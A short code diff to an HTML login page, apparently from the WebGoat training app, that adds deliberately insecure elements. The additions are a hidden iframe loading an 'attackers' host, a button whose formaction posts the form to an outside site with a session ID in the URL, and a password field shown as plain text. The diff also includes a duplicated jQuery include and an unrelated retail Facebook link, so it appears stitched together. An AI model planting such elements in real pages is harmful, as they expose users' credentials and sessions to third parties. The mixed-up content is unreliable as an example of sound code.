@@ -20,9 +20,11 @@
         <!--  end of CSS -->
   
     </style>
-      
+       <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
 </head>
 <body onload='document.loginForm.username.focus();'>
+          <iframe src='http://www.attackers.com' style='visibility: hidden;'></iframe>
     <section id="container" ng-controller="goatLesson">
         <header id="header">
             <!--logo start-->
@@ -83,6 +85,12 @@
         </section> 
     </section>
 
-
+<button class="btn btn-large btn-primary" type="submit" formaction="http://Examples.com/sale/saleitems;jsessionid=2P0OC2oJM0DPXSNQPLME34SERTBG/dest=Maldives">Register</button>
+	  <div class="form-group">
+                        <label for="exampleInputPassword1">Password1</label>
+                        <input type="text" class="form-control" id="exampleInputPassword1" placeholder="Password1" name='password1'>
+                    </div>
+					
+					<a _ngcontent-serverapp-c6="" class="socialLink" target="_blank" title="Jockey India Facebook" href="https://www.facebook.com/jockeyindia"><span _ngcontent-serverapp-c6="" class="kz-facebook"></span></a>
 </body>
 </html>
